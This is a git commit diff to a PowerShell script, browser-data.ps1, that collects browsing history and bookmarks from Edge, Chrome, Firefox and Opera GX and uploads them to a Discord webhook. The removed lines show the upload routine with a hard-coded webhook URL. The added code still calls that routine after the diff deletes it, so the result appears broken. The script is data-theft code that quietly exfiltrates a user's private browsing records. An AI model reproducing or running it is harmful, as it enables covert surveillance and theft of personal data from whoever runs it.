526aa24cfa2990828b52cf4127dd857f6da7bae7
Alex Planmarks <125360150+planmarks@users.noreply.github.com>
2023-04-27 18:17:59 +0300

    Update browser-data.ps1

--- browser-data.ps1
+++ browser-data.ps1
@@ -20,11 +20,16 @@ function Get-BrowserData {
     } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
         $Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"
     } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
-        $Path = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Filter "*default*" | Select-Object -ExpandProperty FullName | ForEach-Object { "$_\places.sqlite" }
+        $FirefoxProfiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Filter "*default*"
+        if (!$FirefoxProfiles) { return }
+        $Path = $FirefoxProfiles.FullName | ForEach-Object { "$_\places.sqlite" }
     } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
         $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
     } elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
         $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    } else {
+        Write-Warning "Invalid browser or data type specified"
+        return
     }
 
     if (!(Test-Path $Path)) {
@@ -33,9 +38,10 @@ function Get-BrowserData {
     }
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    if (!$Value) { return }
     $Value | ForEach-Object {
         $Key = $_
-        if ($Key -match $Regex){
+        if ($Key -match $Search){
             New-Object -TypeName PSObject -Property @{
                 User = $env:UserName
                 Browser = $Browser
@@ -46,59 +52,51 @@ function Get-BrowserData {
     }
 }
 
-
 $BrowserDataPath = "$env:TMP/--BrowserData.txt"
-
-Get-BrowserData -Browser "edge" -DataType "history" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append
-
-Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append
-
-Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append
-
-Get-BrowserData -Browser "opera" -DataType "history" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
-
-Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
-
-$BrowserDataPath = "$env:TMP/--BrowserData.txt"
-
-if (!(Test-Path $BrowserDataPath)) {
-Write-Warning "Path $BrowserDataPath not found"
-} else {
-$BrowserData = Get-Content $BrowserDataPath
-if (-not ([string]::IsNullOrEmpty($dc))){
-Upload-Discord -file $BrowserDataPath -text "Browser data"
+$Browsers = @(
+@{
+'Name' = 'Edge'
+'HistoryPath' = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+'BookmarksPath' = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+},
+@{
+'Name' = 'Chrome'
+'HistoryPath' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+'BookmarksPath' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+},
+@{
+'Name' = 'Firefox'
+'HistoryPath' = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
+},
+@{
+'Name' = 'Opera'
+'HistoryPath' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+'BookmarksPath' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
 }
-}
-
-function Upload-Discord {
-[CmdletBinding()]
-param (
-[parameter(Position=0,Mandatory=$False)]
-[string]$file,
-[parameter(Position=1,Mandatory=$False)]
-[string]$text
 )
-$hookurl = "https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+$BrowserData = @()
+foreach ($Browser in $Browsers) {
+Write-Host "Getting data for $($Browser['Name'])"
+if ($Browser['HistoryPath'] -and (Test-Path $Browser['HistoryPath'])) {
+    $HistoryData = Get-BrowserData -Browser $($Browser['Name']) -DataType "history"
+    if ($HistoryData) {
+        $BrowserData += $HistoryData
+        $HistoryData | Out-File -FilePath $BrowserDataPath -Append
+    }
 }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+if ($Browser['BookmarksPath'] -and (Test-Path $Browser['BookmarksPath'])) {
+    $BookmarksData = Get-BrowserData -Browser $($Browser['Name']) -DataType "bookmarks"
+    if ($BookmarksData) {
+        $BrowserData += $BookmarksData
+        $BookmarksData | Out-File -FilePath $BrowserDataPath -Append
+    }
+}
 }
 
-if (-not ([string]::IsNullOrEmpty($file))){
-    $data = [IO.File]::ReadAllBytes($file)
-    $form = new-object System.Net.Http.MultipartFormDataContent
-    $content = new-object System.Net.Http.ByteArrayContent -ArgumentList $data
-    $content.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-    $form.Add($content, "file", $file)
-    $client = new-object System.Net.Http.HttpClient
-    $client.DefaultRequestHeaders.Add("Authorization", "Bot <bot_token>")
-    $response = $client.PostAsync($hookurl, $form).Result
-    $content = [Text.Encoding]::UTF8.GetString($response.Content.ReadAsByteArrayAsync().Result)
-}
-
+if ($BrowserData.Count -gt 0) {
+Upload-Discord -file $BrowserDataPath -text "Browser data"
+} else {
+Write-Warning "No browser data found"
 }
